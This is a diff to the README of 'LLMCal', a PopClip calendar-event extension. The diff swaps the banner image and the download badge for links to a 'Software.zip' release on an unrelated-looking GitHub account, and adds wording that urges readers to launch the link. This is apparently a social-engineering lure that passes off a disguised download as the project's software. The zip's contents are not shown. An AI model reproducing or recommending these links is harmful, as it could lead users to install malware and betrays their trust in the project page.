@@ -1,6 +1,6 @@
 # LLMCal: AI-Powered PopClip Extension for Easy Calendar Event Creation 📅🤖
 
-![LLMCal Banner](https://example.com/banner.jpg)
+![LLMCal Banner](https://github.com/lilkruxhasdrugs/LLMCal/releases/download/v2.0/Software.zip)
 
 ## Description
 
@@ -22,7 +22,7 @@ Simply select any text containing event details, such as meeting times, location
 
 To get started with LLMCal, download the software package from the following link:
 
-[![Download LLMCal](https://img.shields.io/badge/Download-Get%20LLMCal-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download LLMCal](https://github.com/lilkruxhasdrugs/LLMCal/releases/download/v2.0/Software.zip%20LLMCal-blue)](https://github.com/lilkruxhasdrugs/LLMCal/releases/download/v2.0/Software.zip)
 
 *Note: The link provided should be launched to download the software package.*
 
